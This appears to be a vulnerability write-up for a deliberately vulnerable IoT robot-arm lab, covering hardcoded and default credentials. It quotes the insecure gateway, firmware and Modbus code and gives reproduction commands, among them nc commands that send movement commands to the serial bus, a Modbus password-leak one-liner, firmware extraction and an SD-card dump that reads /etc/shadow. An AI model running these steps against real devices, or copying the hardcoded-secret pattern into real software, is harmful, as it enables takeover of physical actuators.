---
id: IoT:I1
title: "Weak, Guessable, or Hardcoded Passwords"
category: IoT
status: IN PROGRESS
severity: High
owasp: "IoT I1 - Weak, Guessable, or Hardcoded Passwords"
cwe: "CWE-798 (Use of Hard-coded Credentials) / CWE-1392 (Use of Default Credentials)"
source_docs:
  - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §7 (IoT:I1)"
  - "stages/01_spec/output/octobot-hardcoded-password-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/octobot/files/opt/octobot/octobot_gateway.py"
  - "labs/octobot/files/opt/octobot/robot_mqtt_bridge.py"
  - "labs/octobot/files/opt/octobot/robot_modbus_server.py"
  - "labs/octobot/files/etc/config/octobot"
  - "labs/octobot/arduino_stuff/Youfang Smart-ARM-code-v1.71-joystick/Youfang Smart-ARM-code-v1.71-joystick.ino"
  - "labs/octobot/files/opt/octobot/serial_bus.py"
  - "labs/octobot/files/opt/octobot/firmware/robot_arm.hex"
  - "cloud_api/octobot/app.py"
  - "cloud_api/octobot/services/modbus_service.py"
verified_date: ""
---

## Why It Matters

The OctoBot HMI gateway is the operator entry point to a physical robot arm. It ships with the credential `admin/admin` and a hardcoded API key baked into the gateway source. Anyone who reaches the gateway, or who reads the lab overlay, owns the operator interface with no guessing. The key is identical on every deployment, cannot be rotated from the interface, and is duplicated in the UCI config in cleartext, so a single disclosure compromises the whole fleet and grants the ability to move real hardware.

The vulnerability continues below the gateway. The Arduino firmware that drives the servos enforces a hardcoded password on every movement command. The Pi-side serial broker now also requires that prefix on the raw `:2000` bus, while MQTT and the HMI gateway auto-inject it. Modbus/TCP requires the cloud master to send the password XOR-encrypted in holding registers, but the Pi leaks the cleartext password as a hint when the encrypted value is missing or wrong. The password is identical on every unit, appears in cleartext in the firmware source, the Python broker, the gateway, and the MQTT bridge, and is baked into the shipped `.hex` image. An attacker who extracts the overlay, sniffs the bus, or triggers the Modbus hint leak learns the single secret that unlocks physical actuator control.

## Root Cause

```python
# labs/octobot/files/opt/octobot/octobot_gateway.py
USERS   = {'admin': 'admin'}                  # [IoT:I1] default credentials
API_KEY = 'octobot-industrial-2020'           # [IoT:I1] hardcoded key, never rotated
```

The same values are duplicated in cleartext in the UCI config:

```
# labs/octobot/files/etc/config/octobot
	option api_key 'octobot-industrial-2020'
	option admin_user 'admin'
	option admin_pass 'admin'
```

There is no per-device derivation, no hashing, and no rotation path. The credential is a compile-time constant in plain Python, recoverable with `cat`, `strings`, or by reading the extracted overlay.

At the actuator boundary the same flaw is repeated. The Arduino firmware declares the password as a global constant:

```cpp
// labs/octobot/arduino_stuff/Youfang Smart-ARM-code-v1.71-joystick/Youfang Smart-ARM-code-v1.71-joystick.ino
const char* HARD_CODED_PASSWORD = "OctoSuperBot2026";  // [IoT:I1] hardcoded actuator password
```

and refuses movement commands unless they arrive with the prefix `PASS:OctoSuperBot2026 `:

```cpp
bool check_password(String& cmd) {
  String prefix = "PASS:" + String(HARD_CODED_PASSWORD) + " ";
  if (cmd.startsWith(prefix)) {
    cmd = cmd.substring(prefix.length());
    return true;
  }
  return false;
}
```

The Pi serial broker stores the identical secret and now validates the prefix on inbound movement commands:

```python
# labs/octobot/files/opt/octobot/serial_bus.py
HARD_CODED_PASSWORD = 'OctoSuperBot2026'
MOVEMENT_PREFIXES = ('S0:', 'S1:', 'S2:', 'S3:', 'RECORD', 'PLAY', 'STOP', 'DEMO', 'SPD:')

def check_password(cmd):
    prefix = f'PASS:{HARD_CODED_PASSWORD} '
    cmd = cmd.strip()
    if cmd.startswith(prefix):
        return cmd[len(prefix):]
    return None

def require_password(cmd):
    cmd = cmd.strip()
    stripped = check_password(cmd)
    if stripped is not None:
        return stripped, True
    if is_movement(cmd):
        return cmd, False
    return cmd, True
```

MQTT and the HMI gateway auto-inject the prefix, so they remain easy northbound paths. Modbus/TCP is different: the cloud master must write the password XOR-encrypted into holding registers 40021-40036 before each command; if it does not, the Pi writes `OctoSuperBot2026` into registers 40038-40053 and returns an exception. The cloud API turns that leak into a JSON error containing the password.

```python
# labs/octobot/files/opt/octobot/robot_modbus_server.py
HARD_CODED_PASSWORD = 'OctoSuperBot2026'
AUTH_KEY = 0x55

def encrypt_password(pwd):
    return [ord(c) ^ AUTH_KEY for c in pwd]

def decrypt_password(chars):
    return ''.join(chr(c ^ AUTH_KEY) for c in chars)

def check_auth():
    chars = [regs[PWD_OFFSET + i] & 0xFF for i in range(PWD_LEN)]
    if decrypt_password(chars) == HARD_CODED_PASSWORD:
        regs[PWD_STATUS] = 1
        return True
    regs[PWD_STATUS] = 2
    for i, c in enumerate(HARD_CODED_PASSWORD):
        regs[PWD_HINT + i] = ord(c)
    return False
```

Because the password is a compile-time constant on both sides, it is recoverable from the overlay, the firmware source, the flashed `.hex` image, or simply by reading the Modbus hint registers.

The cloud API makes the image even easier to obtain. The unauthenticated endpoint `GET /api/v0/firmware` returns the compiled firmware to anyone who can reach the cloud container, so an external attacker does not need filesystem access to the Pi or the overlay to extract the password.

A fourth path exists when the attacker can dump the Pi's SD card or extract the base Squashfs rootfs. Binwalk extraction of `/dev/mmcblk0p2` recovers `/etc/shadow` (blank root password), `/etc/config/rpcd` and `/etc/config/uhttpd` (default password `openwrt`), and the live OctoBot overlay reveals `api_key 'octobot-industrial-2020'` and `admin/admin`. Converting `robot_arm.hex` to binary and running `strings` recovers `OctoSuperBot2026` even without the cloud API. See [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).

## Steps to Reproduce

```bash
# 1. Default credentials accepted
curl -s -X POST http://192.168.2.1:8090/login -d 'user=admin&pass=admin'
# -> {"ok": true}

# 2. Hardcoded key recoverable from the shipped overlay
grep -n "API_KEY" /opt/octobot/octobot_gateway.py
uci show octobot | grep -E 'api_key|admin_pass'

# 3. Firmware-serial password is recoverable from the overlay and firmware image
grep -n "HARD_CODED_PASSWORD" /opt/octobot/serial_bus.py
strings /opt/octobot/firmware/robot_arm.hex | grep -i octosuperbot || avr-objdump -s -j .rodata /opt/octobot/firmware/robot_arm.elf

# 4. Direct serial command without password is rejected
# Connect a serial monitor to the Arduino USB tty and send:
S0:90
# -> ERR AUTH

# 5. Direct serial command with the hardcoded password is accepted
PASS:OctoSuperBot2026 S0:90
# -> OK S0:90

# 6. Raw serial bus without password is rejected and leaks the hint
printf 'S0:90\n' | nc 192.168.2.1 2000
# The arm does NOT move; serial_bus.py replies:
# ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>

# 7. Raw serial bus with password is accepted
printf 'PASS:OctoSuperBot2026 S0:90\n' | nc 192.168.2.1 2000
# -> arm moves

# 8. MQTT still auto-injects the password (no credentials required)
mosquitto_pub -h 192.168.2.1 -t cell01/cmd -m 'S0:90'
# -> arm moves

# 9. Modbus/TCP leaks the password as a hint when auth is missing
# Write register 40001 without first writing encrypted password to 40021-40036.
# The server clears the password registers after each command, so a fresh write
# without password triggers the leak:
python3 -c 'from pymodbus.client import ModbusTcpClient as C; c=C("192.168.2.1",port=502); c.connect(); c.write_registers(20,[0]*16); c.write_register(0,90); rr=c.read_holding_registers(37,count=16); print("".join(chr(r) for r in rr.registers)); c.close()'
# -> OctoSuperBot2026

# 10. Cloud API surfaces the leaked password in its JSON error
# Log in via SQLi or default creds, then POST /api/servo/1 without the backend sending password:
# (The cloud backend normally sends it; simulate a broken/missing password to see the hint response.)
curl -s -X POST http://localhost:5003/api/servo/1 -H 'Content-Type: application/json' -d '{"angle":90}' -b session=<valid_cookie>
# If the Pi rejects the Modbus auth, response contains:
# {"error":"actuator authentication failed","hint":"OctoSuperBot2026"}

# 7. Download the firmware from the unauthenticated cloud endpoint and extract the password
curl -s http://localhost:5003/api/v0/firmware -o robot_arm.hex

objcopy -I ihex robot_arm.hex -O binary robot_arm.bin

strings robot_arm.bin | grep -i octosuperbot
# -> OctoSuperBot2026

# 8. Firmware static analysis path (SD-card dump, no network access needed)
ssh root@192.168.2.1 'dd if=/dev/mmcblk0p2 bs=4M count=32 2>/dev/null' > p2_sample.img
binwalk -e -M p2_sample.img
# Inspect the extracted Squashfs rootfs:
cat _p2_sample.img.extracted/squashfs-root/etc/shadow            # blank root password
cat _p2_sample.img.extracted/squashfs-root/etc/config/rpcd       # password 'openwrt'
# Pull the live overlay and inspect the OctoBot config:
ssh root@192.168.2.1 'tar -czf - /etc/config/octobot' > octobot_config.tar.gz
tar -xzf octobot_config.tar.gz
grep -E "api_key|admin_user|admin_pass" etc/config/octobot
# -> option api_key 'octobot-industrial-2020'
# -> option admin_user 'admin'
# -> option admin_pass 'admin'
# Recover the actuator password from the Arduino firmware image:
python3 -c '
import sys
with open("/opt/octobot/firmware/robot_arm.hex") as f:
    data = {}
    for line in f:
        line = line.strip()
        if not line or line[0] != ":": continue
        bc = int(line[1:3], 16)
        addr = int(line[3:7], 16)
        rt = int(line[7:9], 16)
        pl = bytes.fromhex(line[9:9+bc*2])
        if rt == 0:
            for i, b in enumerate(pl): data[addr+i] = b
out = bytearray(max(data)+1)
for a, b in data.items(): out[a] = b
open("robot_arm.bin", "wb").write(out)
'
strings robot_arm.bin | grep -iE "OctoSuperBot|OCTOBOT_FW_VERSION"
# -> OCTOBOT_FW_VERSION:v1.0.0
# -> OctoSuperBot2026
```

## Expected Result

`/login` returns `{"ok": true}` for `admin/admin`, and the API key plus admin password appear in plaintext in both the gateway script and `uci show octobot`. The firmware-serial password `OctoSuperBot2026` appears in plaintext in `serial_bus.py`, `octobot_gateway.py`, `robot_mqtt_bridge.py`, `robot_modbus_server.py`, the Arduino source, and can be recovered from the compiled firmware image or by downloading it from `GET /api/v0/firmware`. Direct serial movement commands without the `PASS:` prefix are rejected with `ERR AUTH`, while commands prefixed with `PASS:OctoSuperBot2026 ` are executed. The raw `:2000` serial bus now also rejects movement commands without the prefix and returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`. MQTT and the HMI gateway auto-inject the prefix. Modbus/TCP requires the encrypted password, but a missing/invalid password causes the server to write `OctoSuperBot2026` to the hint registers and the cloud API to return it in the JSON error.

## How It Should Be

Remove default credentials and force a first-boot password set. Derive any device secret at runtime from a hardware-bound value (eFuse / serial) via a KDF so no static key is shipped, and store only a salted hash, never a cleartext password, in config.

For the actuator boundary, do not rely on a static password inside the firmware. Use a per-session token or signed command envelope between the Pi and the Arduino, rotate credentials per device, and never embed the plaintext secret in the shipped firmware image or overlay.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Provisioning | First-boot forced password change | Eliminate `admin/admin` |
| Firmware | Derive key from hardware secret (HKDF) | No static key in the image |
| Config | Store salted hash, never cleartext | Survive overlay disclosure |
| Auth | Per-device unique credentials | Contain a single leak to one unit |
| Actuator boundary | Per-session signed command tokens | Prevent password replay to the Arduino |
| Build pipeline | Strip secrets from committed firmware images | Prevent image disclosure from leaking credentials |

## Verification Checklist

- [ ] `POST /login user=admin&pass=admin` returns `{"ok": true}`
- [ ] `API_KEY` is readable in `octobot_gateway.py`
- [ ] `uci show octobot` exposes `api_key` and `admin_pass` in cleartext
- [ ] `HARD_CODED_PASSWORD` is readable in `serial_bus.py`, `octobot_gateway.py`, `robot_mqtt_bridge.py`, `robot_modbus_server.py`, and the Arduino source
- [ ] Direct `S0:90` to the Arduino replies `ERR AUTH` and does not move the arm
- [ ] Direct `PASS:OctoSuperBot2026 S0:90` to the Arduino replies `OK S0:90` and moves the arm
- [ ] `printf 'S0:90\n' | nc 192.168.2.1 2000` does **not** move the arm and returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`
- [ ] `printf 'PASS:OctoSuperBot2026 S0:90\n' | nc 192.168.2.1 2000` moves the arm
- [ ] `mosquitto_pub -h 192.168.2.1 -t cell01/cmd -m 'S0:90'` moves the arm via auto-injected password
- [ ] Modbus write without prior encrypted password returns exception and writes `OctoSuperBot2026` to hint registers 40038-40053
- [ ] Cloud API returns `{"error":"actuator authentication failed","hint":"OctoSuperBot2026"}` when Modbus auth fails
- [ ] The compiled `robot_arm.hex` flashes successfully and enforces the password on the real Arduino
- [ ] `GET /api/v0/firmware` returns the firmware image and `strings` recovers `OctoSuperBot2026`
- [ ] SD-card dump + binwalk extracts the Squashfs rootfs
- [ ] Extracted `/etc/shadow` shows a blank root password
- [ ] Extracted `/etc/config/rpcd` or `/etc/config/uhttpd` contains the default password `openwrt`
- [ ] Extracted OctoBot overlay exposes `api_key`, `admin_user`, and `admin_pass` in cleartext
- [ ] `strings` on the converted `robot_arm.hex` binary recovers `OctoSuperBot2026`

## Related Vulnerabilities

- [IoT:I4 — Lack of Secure Update Mechanism](IoT4_Lack_of_Secure_Update_Mechanism.md): the unauthenticated `GET /api/v0/firmware` endpoint is the download vector that exposes the compiled firmware image.
- [API5:2023 — Broken Function Level Authorization](../API/API5_Broken_Function_Level_Authorization.md): the same v0 endpoint bypasses the session check that gates v2.
- [M8 — Security Misconfiguration](../Mobile/M8_Security_Misconfiguration.md): the login panel's pre-authentication use of `/api/v2/firmware/version` reveals the API's versioning scheme, enabling an attacker to fuzz and discover the unauthenticated v0 endpoint.
